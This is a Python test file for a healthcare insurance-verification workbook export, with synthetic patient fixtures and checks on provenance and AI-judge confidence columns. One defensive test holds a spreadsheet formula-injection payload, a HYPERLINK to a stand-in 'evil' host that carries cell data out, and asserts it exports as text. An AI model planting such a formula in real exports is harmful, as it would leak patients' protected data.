import json
from datetime import UTC, datetime
from io import BytesIO
from pathlib import Path
from uuid import uuid4

from openpyxl import load_workbook
from openpyxl.worksheet.worksheet import Worksheet

from vera_core.forms.dsl import PromotedFields
from vera_core.forms.export import build_workbook
from vera_core.services.call_provenance import CallAttempt, FieldProvenance, JudgeInfo

# Same depth as test_export_form_sheet.py: tests/unit/forms/<file> -> vera-backend.
FORM_SCHEMA_DIR = Path(__file__).resolve().parents[3] / "data" / "form_schemas"

V2 = {
    "dsl_version": "2.1",
    "name": "Test",
    "insurance_type": "infertility_treatment",
    # The DSL requires every promoted column mapped to a system_fields target —
    # point them all at one leaf (same shortcut as test_conditions.py).
    # "patient_information" is a LEFT_TOP placement key (export_form_sheet.py)
    # so the replica anchors it at A1.
    "system_fields": {
        "network_status": "sections.patient_information.network_status",
    },
    "rep_call_reference_number_field": "sections.patient_information.network_status",
    "promoted_fields": dict.fromkeys(
        PromotedFields.model_fields, "sections.patient_information.network_status"
    ),
    "sections": {
        "patient_information": {
            "title": "Patient Information",
            "role": "collect",
            "fields": {
                "network_status": {
                    "type": "text",
                    "title": "Network status",
                    "role": "ask",
                    "required": True,
                    "prompt": {"ask": "What is the network status?"},
                },
            },
        },
    },
    "tasks": [{"task_key": "t1", "title": "Task 1", "sections": ["patient_information"]}],
}


def _attempt(n: int, mode: str, *, authoritative: bool = True) -> CallAttempt:
    return CallAttempt(
        id=uuid4(),
        attempt=n,
        mode=mode,
        status="completed",
        created_at=datetime(2026, 7, 10, tzinfo=UTC),
        retry_of=None,
        changed_paths=[],
        authoritative=authoritative,
    )


def test_v2_form_sheet_is_ui_replica() -> None:
    """The v2 "Form" sheet is now export_form_sheet.render_form_sheet's UI
    replica, not the old flat bold-header/label-value walk — anchor on the
    replica's known geometry instead."""
    path = "sections.patient_information.network_status"
    data = build_workbook(
        V2,
        values={path: "in-network"},
        sources={path: "ai_call"},
        provenance={path: FieldProvenance(attempt=1, mode="full", judge=JudgeInfo(90, True, "e"))},
        attempts=[_attempt(1, "full")],
    )
    wb = load_workbook(BytesIO(data))
    assert wb.sheetnames == ["Form", "Provenance"]
    ws = wb["Form"]
    # LEFT_TOP section is anchored at A1 with a label/value pair below it.
    assert ws.cell(row=1, column=1).value == "Patient Information"
    assert ws.cell(row=2, column=1).value == "Network status *"
    assert ws.cell(row=2, column=2).value == "in-network"
    prov_rows = [tuple(r) for r in wb["Provenance"].iter_rows(values_only=True)]
    assert any(r[0] == path and r[2] == "ai_call" and r[3] == 1 for r in prov_rows if r[0])
    assert any(r and r[0] == "Call history" for r in prov_rows)


def test_v1_falls_back_to_flat_listing() -> None:
    data = build_workbook(
        {"sections": []},
        values={"cov.a": "x"},
        sources={"cov.a": "human"},
        provenance={},
        attempts=[],
    )
    wb = load_workbook(BytesIO(data))
    rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
    assert ("cov.a", "x") in rows


IVF = "sections.infertility_treatment.in_vitro_fertilization"
IUI = "sections.infertility_treatment.intrauterine_insemination"
CRYO = "sections.infertility_treatment.embryo_cryopreservation"

# The five judge outcomes a reviewer can meet, on the two Infertility Treatment leaf
# kinds that carry disputes: a row-level `covered` cell and the group-level
# `cycle_limit` rowspan extra. Bands are the confidenceLevel thresholds in
# vera-frontend/src/lib/ibv/disputes.ts (>=95 high, >=85 medium, >=75 low, else
# very-low; a rejected verdict shows no number at all).
JUDGED_FIELDS: dict[str, tuple[JudgeInfo, str]] = {
    f"{IVF}.cpt_58970.covered": (JudgeInfo(96, True, "Rep: IVF is covered."), "high"),
    f"{IVF}.cycle_limit": (JudgeInfo(88, True, "Rep: three cycles per lifetime."), "medium"),
    f"{IUI}.cpt_58323.covered": (JudgeInfo(79, True, "Rep: IUI covered, I think."), "low"),
    f"{IUI}.cycle_limit": (JudgeInfo(68, True, "Rep was unsure of the IUI limit."), "very-low"),
    f"{CRYO}.cpt_89258.covered": (JudgeInfo(91, False, "No cryo statement."), "unsupported"),
}

# A complete form for one patient. `cycle_limit` is gated on infertility_tx_covered
# AND at least one covered CPT in its own group, so those gate-openers are load
# bearing — drop one and the cell exports blank and grey instead of carrying a value.
PATIENT_VALUES: dict[str, object] = {
    "sections.patient_information.chart_number": "CH-40192",
    "sections.patient_information.patient_name": "Meera Sundaram",
    "sections.patient_information.patient_dob": "1989-11-14",
    "sections.patient_information.patient_gender": "Female",
    "sections.patient_information.spouse_partner_name": "Arjun Sundaram",
    "sections.patient_information.spouse_partner_dob": "1987-06-02",
    "sections.patient_information.spouse_gender": "Male",
    "sections.appointment_information.appointment_type": "New Patient",
    "sections.appointment_information.appointment_date": "2026-09-08",
    "sections.verification_information.verified_by": "R. Okafor",
    "sections.verification_information.verified_at": "2026-08-12",
    "sections.verification_information.callback_number": "(415) 555-0143",
    "sections.insurance_information.doctor_inside_network": "Yes",
    "sections.insurance_information.facility_inside_network": "Yes",
    "sections.insurance_information.out_of_network_coverage": "No",
    "sections.insurance_information.plan_type": "PPO",
    "sections.insurance_information.cob_status": "Primary",
    "sections.insurance_information.policy_number": "POL-778213",
    "sections.insurance_information.group_name": "Northwind Health",
    "sections.insurance_information.group_number": "GRP-4471",
    "sections.insurance_information.policy_situs": "California",
    "sections.benefit_coverage.benefit_year_type": "Calendar Year",
    "sections.benefit_coverage.plan_effective_date": "2026-01-01",
    "sections.benefit_coverage.plan_year_information": "2026",
    "sections.benefit_coverage.coverage_type": "Family",
    "sections.benefit_coverage.pcp_referral_required": "No",
    "sections.benefit_coverage.telehealth_covered": "Yes",
    "sections.benefit_coverage.plan_fund_type": "Self Insured",
    "sections.benefit_coverage.employer_support_size": "Large Group",
    "sections.benefit_coverage.infertility_plan_mandate": "Yes",
    "sections.infertility_treatment.infertility_tx_covered": "Yes",  # gate-opener
    f"{IVF}.cpt_58970.covered": "Yes",  # gate-opener for the IVF cycle_limit
    f"{IVF}.cpt_58970.copay": 40.0,  # integral float -> "40", never "40.0"
    f"{IVF}.cpt_58970.coinsurance": 20.0,
    f"{IVF}.cpt_58970.prior_auth": "Yes",
    f"{IVF}.cycle_limit": "3",
    f"{IUI}.cpt_58323.covered": "Yes",  # gate-opener for the IUI cycle_limit
    f"{IUI}.cpt_58323.copay": "$25",
    f"{IUI}.cycle_limit": "6",
    f"{CRYO}.cpt_89258.covered": "No",
}


def _judged_export() -> dict[str, Worksheet]:
    """Export the patient form above against the real shipped IBV schema."""
    schema_json = json.loads((FORM_SCHEMA_DIR / "ibv_form_standard_v2.json").read_text("utf-8"))
    data = build_workbook(
        schema_json,
        values=PATIENT_VALUES,
        sources=dict.fromkeys(PATIENT_VALUES, "ai_call"),
        provenance={
            path: FieldProvenance(attempt=2, mode="retry", judge=judge)
            for path, (judge, _band) in JUDGED_FIELDS.items()
        },
        attempts=[_attempt(1, "full"), _attempt(2, "retry")],
    )
    wb = load_workbook(BytesIO(data))
    return {"Form": wb["Form"], "Provenance": wb["Provenance"]}


def test_judged_infertility_fields_carry_their_verdict_to_the_provenance_sheet() -> None:
    """Every judge outcome the review chip can show must be reconstructable from the
    export: the reviewer's chip is transient UI, the workbook is the durable record."""
    prov = _judged_export()["Provenance"]
    rows = {r[0]: r for r in prov.iter_rows(values_only=True) if r[0]}

    for path, (judge, _band) in JUDGED_FIELDS.items():
        assert path in rows, f"{path} missing from the Provenance sheet"
        _fpath, _label, source, attempt, mode, confidence, supported = rows[path][:7]
        assert (source, attempt, mode) == ("ai_call", 2, "retry")
        assert confidence == judge.confidence
        assert supported is judge.supported

    # The rejected verdict keeps its number here even though the chip hides it — the
    # export is the audit record, and "91 but rejected" is the fact being recorded.
    assert rows[f"{CRYO}.cpt_89258.covered"][5] == 91
    assert rows[f"{CRYO}.cpt_89258.covered"][6] is False


def test_judged_export_labels_every_provenance_row_and_bolds_both_headers() -> None:
    prov = _judged_export()["Provenance"]
    header = [c.value for c in prov[1]]
    assert header[:7] == [
        "Field path",
        "Label",
        "Source",
        "Attempt",
        "Mode",
        "Judge confidence",
        "Supported",
    ]
    # Every heading cell bold, not just "Field path"; the header row stays on screen.
    assert all(prov.cell(row=1, column=c).font.bold for c in range(1, 9))
    assert prov.freeze_panes == "A2"

    labels = {r[0]: r[1] for r in prov.iter_rows(values_only=True) if r[0]}
    assert labels[f"{IVF}.cpt_58970.covered"] == "Covered"
    assert labels[f"{IVF}.cycle_limit"] == "Cycle Limit"


def test_judged_values_land_in_the_infertility_grid_cells() -> None:
    """The disputed values reach the Form replica in the right grid cells, and an
    integral float renders without its ".0" so a money column stays consistent."""
    ws = _judged_export()["Form"]

    def first_row_where(text: str, start: int = 1) -> int:
        # Every grid repeats the "Service" header, so anchor forward from the section
        # title rather than keying by value — a dict would keep only the last match.
        return next(
            r for r in range(start, ws.max_row + 1) if ws.cell(row=r, column=1).value == text
        )

    header = first_row_where("Service", first_row_where("Infertility Treatment"))
    assert [ws.cell(row=header, column=c).value for c in (1, 2, 3, 4, 5, 6, 8)] == [
        "Service",
        "ICD-10",
        "CPT Code",
        "Covered",
        "Copay ($)",
        "Coinsurance (%)",
        "Cycle Limit",
    ]

    ivf = first_row_where("In Vitro Fertilization (IVF)", header)
    assert ws.cell(row=ivf, column=3).value == "CPT 58970"
    assert ws.cell(row=ivf, column=4).value == "Yes"
    assert ws.cell(row=ivf, column=5).value == "40"  # 40.0 stored, "40" exported
    assert ws.cell(row=ivf, column=6).value == "20"
    assert ws.cell(row=ivf, column=8).value == "3"  # group-level cycle_limit extra

    # Coinsurance (%) used to render in a 3-wide spacer column; it must never again
    # be narrower than the columns whose values are shorter than its own header.
    assert (ws.column_dimensions["F"].width or 0) >= len("Coinsurance (%)")


def test_formula_shaped_values_export_as_inert_text() -> None:
    """A field value starting with "=" (attacker-influenceable: rep speech via
    LLM extraction, intake, human edits) must land in the PHI export as text,
    never a live Excel formula (exfiltration surface)."""
    payload = '=HYPERLINK("http://evil/?x="&B2,"click")'
    data = build_workbook(
        {"sections": []},
        values={"cov.a": payload},
        sources={"cov.a": "human"},
        provenance={},
        attempts=[],
    )
    wb = load_workbook(BytesIO(data))
    cell = next(c for row in wb["Form"].iter_rows() for c in row if c.value == payload)
    assert cell.data_type != "f"
    rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
    assert ("cov.a", payload) in rows  # text preserved verbatim


def test_a_non_authoritative_call_is_reported_as_such_on_both_sheets() -> None:
    """The flag must be RENDERED, not defaulted: a workbook that silently claims every answer
    is payer-proven is worse than one that omits the column (spec E7)."""
    schema_json = json.loads((FORM_SCHEMA_DIR / "ibv_form_standard_v2.json").read_text("utf-8"))
    path = f"{IVF}.cpt_58970.covered"
    data = build_workbook(
        schema_json,
        values={path: "Yes"},
        sources={path: "ai_call"},
        provenance={path: FieldProvenance(attempt=1, mode="full", judge=None, authoritative=False)},
        attempts=[_attempt(1, "full", authoritative=False)],
    )
    prov = load_workbook(BytesIO(data))["Provenance"]

    header = [c.value for c in prov[1]]
    assert header[7] == "Authoritative"

    rows = {r[0]: r for r in prov.iter_rows(values_only=True) if r[0]}
    assert rows[path][7] is False

    # The Call-history block repeats a heading row further down the same sheet.
    history_header = next(r for r in prov.iter_rows(values_only=True) if r and r[0] == "Attempt")
    assert history_header[5] == "Authoritative"
    history_row = next(r for r in prov.iter_rows(values_only=True) if r and r[0] == 1)
    assert history_row[5] is False
